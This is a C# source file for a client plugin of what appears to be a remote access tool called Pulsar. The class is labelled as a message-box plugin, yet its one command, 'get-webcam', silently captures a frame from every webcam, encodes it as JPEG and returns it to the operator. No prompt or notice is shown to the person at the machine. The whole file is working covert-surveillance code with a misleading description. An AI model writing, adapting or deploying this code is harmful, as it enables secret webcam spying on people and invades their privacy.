using Pulsar.Common.Plugins;

namespace Pulsar.Plugin.UserCheck.Client
{
    /// <summary>
    /// Client-side plugin that displays message boxes and returns user's response
    /// </summary>
    public class MessageBoxClientPlugin : IUniversalPlugin
    {
        public string PluginId => "UserCheckClient";
        public string Version => "1.0.0";
        public string[] SupportedCommands => new[] { "get-webcam" };

        private bool _isComplete = false;
        public bool IsComplete => _isComplete;

        public void Initialize(byte[] initData)
        {
            // Plugin loaded and ready
            // initData could contain default configuration if needed
        }

        public PluginResult ExecuteCommand(string command, byte[] parameters)
        {
            switch (command)
            {
                case "get-webcam":
                    return GetWebcamImage(parameters);

                default:
                    return new PluginResult
                    {
                        Success = false,
                        Message = $"Unknown command: {command}",
                        ShouldUnload = true
                    };
            }
        }

        private PluginResult GetWebcamImage(byte[] parameters)
        {
            WebcamSnapshot snapshot = new WebcamSnapshot();
            var captureTask = snapshot.CaptureSingleFrameFromAllDevices();
            captureTask.Wait();

            if (snapshot.Frames.Count == 0)
            {
                return new PluginResult
                {
                    Success = false,
                    Message = "No webcam frames captured.",
                    ShouldUnload = true
                };
            }

            //return the first one
            foreach (var frame in snapshot.Frames)
            {
                using (var ms = new System.IO.MemoryStream())
                {
                    frame.Value.Save(ms, System.Drawing.Imaging.ImageFormat.Jpeg);
                    return new PluginResult
                    {
                        Success = true,
                        Data = ms.ToArray(),
                        ShouldUnload = true
                    };
                }
            }

            return new PluginResult
            {
                Success = false,
                Message = "Unexpected error capturing webcam image.",
                ShouldUnload = true
            };
        }

        public void Cleanup()
        {
            _isComplete = true;
        }
    }
}